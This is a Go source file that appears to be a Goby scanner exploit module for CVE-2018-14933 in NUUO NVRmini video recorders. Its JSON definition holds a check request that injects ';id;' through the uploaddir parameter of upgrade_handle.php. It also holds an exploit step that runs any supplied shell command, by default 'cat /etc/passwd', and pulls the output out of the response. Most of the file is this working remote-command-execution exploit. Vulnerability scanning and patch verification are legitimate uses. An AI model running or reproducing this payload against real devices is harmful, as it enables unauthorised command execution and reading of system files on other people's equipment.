package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "NVRmini RCE (CVE-2018-14933)",
    "Description": "upgrade_handle.php on NUUO NVRmini devices allows Remote Command Execution via shell metacharacters in the uploaddir parameter for a writeuploaddir command.",
    "Product": "NVRmini",
    "Homepage": "https://www.nuuo.com/ProductNode.php?node=2",
    "DisclosureDate": "2021-06-01",
    "Author": "Coco413",
    "GobyQuery": "app=\"NUUO-NVRmini\"",
    "Level": "3",
    "Impact": "<p>Attacker can exploit this vulnerability by injecting operating system commands.</p>",
    "Recommendation": "<p>At present, the manufacturer has released a repair patch to solve this security problem. It is recommended that users of this software upgrade to the latest version.</p>",
    "References": [
        "https://www.exploit-db.com/exploits/46340"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "cat%20/etc/passwd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;id;%27",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/upgrade_handle.php?cmd=writeuploaddir&uploaddir=%27;{{{cmd}}};%27",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)upload_tmp_dir.*?\\n(.*?)\\n<br />"
            ]
        }
    ],
    "Tags": [
        "RCE"
    ],
    "CVEIDs": [
        "CVE-2018-14933"
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6826"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
